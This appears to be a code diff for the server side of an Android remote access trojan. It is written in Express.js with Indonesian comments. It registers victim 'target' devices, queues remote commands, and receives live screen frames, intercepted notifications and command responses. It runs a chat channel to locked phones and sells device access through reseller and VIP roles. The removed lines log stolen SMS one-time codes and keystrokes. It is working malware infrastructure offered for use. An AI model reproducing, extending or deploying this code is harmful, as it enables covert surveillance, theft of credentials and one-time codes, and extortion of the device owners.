+app.post('/rat/revoke-member', ratGuard, (req, res) => {
+  const role = (req._ratUser.role||'').toLowerCase();
+  const canRevoke = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
+  if (!canRevoke) return res.json({ valid: false, message: 'Role tidak diizinkan revoke akses' });
+  const { memberUsername } = req.body;
+  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
+  if (perms[req._ratUser.username]) delete perms[req._ratUser.username][memberUsername];
+  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
+  res.json({ valid: true });
+});
+
+app.get('/rat/my-devices', ratGuard, (req, res) => {
+  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
+  const user = req._ratUser;
+  const targets = readRat(RAT_TARGETS);
+  const role = (user.role||'').toLowerCase();
+  const isOwnerLevel = ['owner','high owner'].includes(role);
+  const isAdminLevel = ['high admin','admin'].includes(role);
+  const isResellerVip = ['reseller','vip'].includes(role);
+  let devices;
+
+  if (isOwnerLevel || isAdminLevel || isResellerVip) {
+    // Semua role tinggi langsung pakai pairId sendiri → lihat device milik sendiri
+    const dbUser = db.find(u => u.username === user.username);
+    if (!dbUser) return res.json({ valid: true, devices: [] });
+    // Auto-approve diri sendiri di rat_perms supaya APK tidak tampilkan "Akses belum disetujui"
     try {
-        fs.writeFileSync(file, JSON.stringify(data, null, 2));
-    } catch (e) { console.log(`[!] Gagal simpan database: ${file}`, e); }
-};
-
-// ENDPOINT HEARTBEAT
-app.post('/api/heartbeat/:id', (req, res) => {
-    const targetId = req.params.id;
-    let targets = readData(TARGETS_FILE);
-    const index = targets.findIndex(t => t.id === targetId);
-
-    if (index !== -1) {
-        targets[index].lastSeen = new Date();
-        targets[index].status = "Online";
-        saveData(TARGETS_FILE, targets);
-    }
-    
-    res.status(200).send('1'); 
+      const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
+      if (!perms[user.username]) perms[user.username] = {};
+      if (!perms[user.username][user.username]) {
+        perms[user.username][user.username] = { approved: true, allDevices: true, devices: [] };
+        fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
+      }
+    } catch(_) {}
+    devices = targets.filter(t => t.ownerPairId === dbUser.pairId);
+  } else {
+    // Member atau role lain → cek perms dari owner
+    const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
+    const ownerEntry = Object.entries(perms).find(([,p]) => p[user.username]?.approved);
+    if (!ownerEntry) return res.json({ valid: true, devices: [] });
+    const [ownerName, ownerPerms] = ownerEntry;
+    const perm = ownerPerms[user.username];
+    const ownerUser = db.find(u => u.username === ownerName);
+    const ownerDevices = targets.filter(t => t.ownerPairId === ownerUser?.pairId);
+    devices = perm.allDevices ? ownerDevices : ownerDevices.filter(d => perm.devices?.includes(d.id));
+  }
+  res.json({ valid: true, devices });
 });
 
-app.post('/api/register-target', (req, res) => {
-    const deviceData = req.body;
-    let targets = readData(TARGETS_FILE);
-    const index = targets.findIndex(t => t.id === deviceData.id);
-
-    if (index !== -1) {
-        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date() };
-    } else {
-        targets.push({ ...deviceData, lastSeen: new Date() });
-    }
-    saveData(TARGETS_FILE, targets);
-    res.json({ status: 'ok' });
+// ── Pair + Command + Response ────────────────────────────────────────────────
+app.post('/api/pair-target', (req, res) => {
+  // Endpoint ini dipanggil dari APK target (bukan dari user login), jadi pakai pairId bukan sessionKey
+  const { pairId, deviceId, model, battery } = req.body;
+  if (!pairId || !deviceId) return res.status(400).json({ error: 'Missing fields' });
+  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
+  const owner = db.find(u => u.pairId === pairId);
+  if (!owner) return res.status(403).json({ error: 'Invalid pairId' });
+  let t = readRat(RAT_TARGETS);
+  const idx = t.findIndex(d => d.id === deviceId);
+  const entry = { id: deviceId, model: model||'Unknown', battery: battery||'?', ownerPairId: pairId, lastSeen: new Date().toISOString() };
+  if (idx >= 0) t[idx] = { ...t[idx], ...entry }; else t.push(entry);
+  saveRat(RAT_TARGETS, t);
+  res.json({ valid: true, message: 'Paired' });
 });
 
-app.get('/api/list-targets', (req, res) => {
-    const targets = readData(TARGETS_FILE);
-    res.json(targets);
-});
-
-app.post('/api/post-notification/:id', (req, res) => {
-    const targetId = req.params.id;
-    let allNotifs = readData(NOTIF_FILE);
-    
-    if(req.body.category === "OTP/SMS") {
-        console.log(`[intercept] SMS CURIAN: ${req.body.title} -> ${req.body.body}`);
-    }
-
-    allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
-    if (allNotifs.length > 500) allNotifs = allNotifs.slice(0, 500);
-    saveData(NOTIF_FILE, allNotifs);
-    console.log(`[NOTIF] Data masuk dari Target: ${targetId}`);
-    res.json({ status: 'saved' });
-});
-
-app.get('/api/get-notifications/:id', (req, res) => {
-    const allNotifs = readData(NOTIF_FILE);
-    const filtered = allNotifs.filter(n => n.targetId === req.params.id);
-    res.json(filtered);
-});
-
-app.post('/api/send-command', (req, res) => {
-    const { id, command, extra } = req.body;
-    let commands = readData(COMMANDS_FILE);
-    
-    commands = commands.filter(c => c.targetId !== id);
-    commands.push({ targetId: id, command, extra, timestamp: new Date() });
-    
-    saveData(COMMANDS_FILE, commands);
-    console.log(`[CMD] Operator -> ${id}: ${command}`);
-    res.json({ status: 'queued' });
+app.post('/api/send-command', ratGuard, (req, res) => {
+  const { id, command, extra } = req.body;
+  let cmds = readRat('./rat_commands.json');
+  cmds = cmds.filter(c => c.id !== id);
+  cmds.push({ id, command, extra: extra||'', ts: Date.now() });
+  saveRat('./rat_commands.json', cmds);
+  res.json({ valid: true });
 });
 
 app.get('/api/get-command/:id', (req, res) => {
-    const targetId = req.params.id;
-    let commands = readData(COMMANDS_FILE);
-    const cmdIndex = commands.findIndex(c => c.targetId === targetId);
-
-    if (cmdIndex !== -1) {
-        const cmd = commands[cmdIndex];
-        commands.splice(cmdIndex, 1); 
-        saveData(COMMANDS_FILE, commands);
-        return res.json(cmd);
-    }
-    res.status(204).send();
+  // Dipanggil dari APK target, no auth needed
+  let cmds = readRat('./rat_commands.json');
+  const cmd = cmds.find(c => c.id === req.params.id);
+  if (!cmd) return res.json({});
+  cmds = cmds.filter(c => c.id !== req.params.id);
+  saveRat('./rat_commands.json', cmds);
+  let t = readRat(RAT_TARGETS);
+  const idx = t.findIndex(d => d.id === req.params.id);
+  if (idx >= 0) { t[idx].lastSeen = new Date().toISOString(); saveRat(RAT_TARGETS, t); }
+  res.json(cmd);
 });
 
 app.post('/api/post-response/:id', (req, res) => {
-    const targetId = req.params.id;
-    const { cmd, data } = req.body;
-    let responses = readData(RESPONSES_FILE);
-
-    if(cmd === "lock_key_attempt" || cmd === "lock_input_log") {
-        console.log(`[KEYLOG] Target ${targetId} mengetik: ${data.input || data.attempt}`);
-    }
-
-    const index = responses.findIndex(r => r.targetId === targetId);
-    const newRes = { targetId, cmd, data, timestamp: new Date() };
-
-    if (index !== -1) responses[index] = newRes;
-    else responses.push(newRes);
-    
-    saveData(RESPONSES_FILE, responses);
-    console.log(`[!] Respon ${cmd} diterima dari ${targetId}`);
-    res.json({ status: 'received' });
+  // Dari APK target, no auth
+  let resp = readRat('./rat_responses.json');
+  resp = resp.filter(r => r.id !== req.params.id);
+  resp.push({ id: req.params.id, cmd: req.body.cmd||'', data: req.body.data||{}, ts: Date.now() });
+  saveRat('./rat_responses.json', resp);
+  res.json({ valid: true });
 });
 
-app.get('/api/get-response/:id', (req, res) => {
-    const responses = readData(RESPONSES_FILE);
-    const resData = responses.find(r => r.targetId === req.params.id);
-    res.json(resData || {});
+app.get('/api/get-response/:id', ratGuard, (req, res) => {
+  const resp = readRat('./rat_responses.json');
+  const r = resp.find(r => r.id === req.params.id);
+  res.json(r || {});
 });
 
-app.post('/api/login', (req, res) => {
-    console.log(`[LOGIN] Bypass attempt for user: ${req.body.username}`);
-    res.json({ status: 'ok', message: 'Bypassed by Dark-Ai' });
+// ── Live Frame ───────────────────────────────────────────────────────────────
+app.post('/api/live-frame/:id', (req, res) => {
+  // Dari APK target, no auth
+  const { frame, ts } = req.body;
+  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
+  res.json({ valid: true });
 });
 
-console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
-console.log(`    DEWA VERSE - RAT EDITION   `);
-console.log(`    STATUS : PERSISTENCE ACTIVE        `);
-console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
-
-// ===== START SERVER (HANYA SATU APP.LISTEN) =====
-app.listen(PORT, () => {
-  console.log(`🚀 Server aktif di Server running on http://${domain}:${PORT}`);
-  startVipSessions();
-  startUserSessions();
-
-  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
-  setInterval(autoRefresh, THIRTY_MINUTES);
-  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
-  scheduleAutoClean();
+app.get('/api/live-frame/:id', ratGuard, (req, res) => {
+  const d = RAT_LIVE[req.params.id];
+  if (!d || Date.now() - d.ts > 5000) return res.json({ frame: '' });
+  res.json({ frame: d.frame });
 });
+
+// ── Notifications ────────────────────────────────────────────────────────────
+app.post('/api/post-notification/:id', (req, res) => {
+  // Dari APK target, no auth
+  let notifs = readRat('./rat_notifs.json');
+  notifs.push({ id: req.params.id, ...req.body, ts: Date.now() });
+  if (notifs.length > 200) notifs = notifs.slice(-200);
+  saveRat('./rat_notifs.json', notifs);
+  res.json({ valid: true });
+});
+
+app.get('/api/get-notifications/:id', ratGuard, (req, res) => {
+  const notifs = readRat('./rat_notifs.json');
+  res.json(notifs.filter(n => n.id === req.params.id).slice(-50));
+});
+
+// ── Lock Chat ────────────────────────────────────────────────────────────────
+app.post('/api/lock-chat/:id', ratGuard, (req, res) => {
+  let chats = readRat('./rat_chats.json');
+  if (!Array.isArray(chats)) chats = [];
+  chats.push({ id: req.params.id, from: req.body.from||'owner', text: req.body.text||'', time: new Date().toLocaleTimeString('id-ID') });
+  if (chats.length > 500) chats = chats.slice(-500);
+  saveRat('./rat_chats.json', chats);
+  res.json({ valid: true });
+});
+
+app.get('/api/lock-chat/:id', (req, res) => {
+  // Dari APK target boleh baca chat
+  const chats = readRat('./rat_chats.json');
+  const last = chats.filter(c => c.id === req.params.id).slice(-1)[0];
+  res.json(last || {});
+});
+
+app.get('/api/lock-chat-all/:id', ratGuard, (req, res) => {
+  const chats = readRat('./rat_chats.json');
+  res.json({ messages: chats.filter(c => c.id === req.params.id).slice(-100) });
+});
+
+app.delete('/api/lock-chat/:id', ratGuard, (req, res) => {
+  let chats = readRat('./rat_chats.json');
+  chats = chats.filter(c => c.id !== req.params.id);
+  saveRat('./rat_chats.json', chats);
+  res.json({ valid: true });
+});
+
+// ── Auto cleanup setiap jam ───────────────────────────────────────────────────
+['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
+  setInterval(() => {
+    try {
+      let data = readRat(`./${f}.json`);
+      const now = Date.now();
+      if (f === 'rat_commands')  data = data.filter(d => now - (d.ts||0) < 60000);
+      if (f === 'rat_responses') data = data.filter(d => now - (d.ts||0) < 120000);
+      saveRat(`./${f}.json`, data);
+    } catch(_) {}
+  }, 3600000);
+});
+
+// ── Admin RAT endpoints ──────────────────────────────────────────────────────
+app.get('/admin/listpairids', ratGuard, (req, res) => {
+  const role = (req._ratUser.role||'').toLowerCase();
+  if (!['owner','high owner','high admin','admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
+  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
+  res.json({ valid: true, users: db.map(u => ({ username: u.username, pairId: u.pairId||null })) });
+});
+
+app.get('/admin/genpairid', ratGuard, (req, res) => {
+  const role = (req._ratUser.role||'').toLowerCase();
+  if (!['owner','high owner','high admin','admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
+  const { username } = req.query;
+  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
+  const idx = db.findIndex(u => u.username === username);
+  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
+  db[idx].pairId = genPairId();
+  fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
+  res.json({ valid: true, pairId: db[idx].pairId });
+});
+
+// ════════════════════════════════════════════════════════════════════════════
+// ██████████  END RAT CONTROL SYSTEM  ████████████████████████████████████████
+// ════════════════════════════════════════════════════════════════════════════
